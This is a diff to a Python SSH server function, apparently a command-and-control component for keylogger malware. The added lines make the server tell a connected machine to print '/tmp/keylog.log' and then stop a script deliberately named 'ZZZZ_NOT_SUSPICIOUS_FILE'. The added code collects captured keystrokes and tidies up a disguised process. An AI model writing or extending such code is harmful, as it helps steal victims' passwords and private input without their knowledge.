@@ -331,7 +331,12 @@ def serverForever(commandArgs):
             logger.info("Received SSH message.")
             logger.info(RXmessage)
 
-            sshChannel.send("helllloooooo")
+            time.sleep(10)
+            sshChannel.send("cat /tmp/keylog.log")
+
+
+            time.sleep(1)
+            sshChannel.send("python3 ZZZZ_NOT_SUSPICIOUS_FILE stop")
             sshChannel.close()
 
             # Once task is completed close connection socket
